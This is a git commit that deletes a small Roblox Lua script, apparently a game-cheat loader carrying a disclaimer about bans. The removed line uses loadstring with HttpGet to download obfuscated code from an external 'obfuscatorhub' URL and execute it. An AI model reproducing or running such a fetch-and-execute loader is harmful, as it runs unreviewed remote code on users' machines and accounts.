10161d51b7db71fac38bdb8d96613bffa45f28f8
Xero <99786322+BACARDI05@users.noreply.github.com>
2026-06-27 23:58:04 +0530

    Delete rScripts/PlusOneStepBackflip.lua

--- rScripts/PlusOneStepBackflip.lua
+++
@@ -1,5 +0,0 @@
---[[
-    Use scripts on your own risk, We are not responsible for any bans or issues that may arise from using these scripts.
-    Feel free to ask script related issues.
-]]
-loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/2jlht3dd"))()
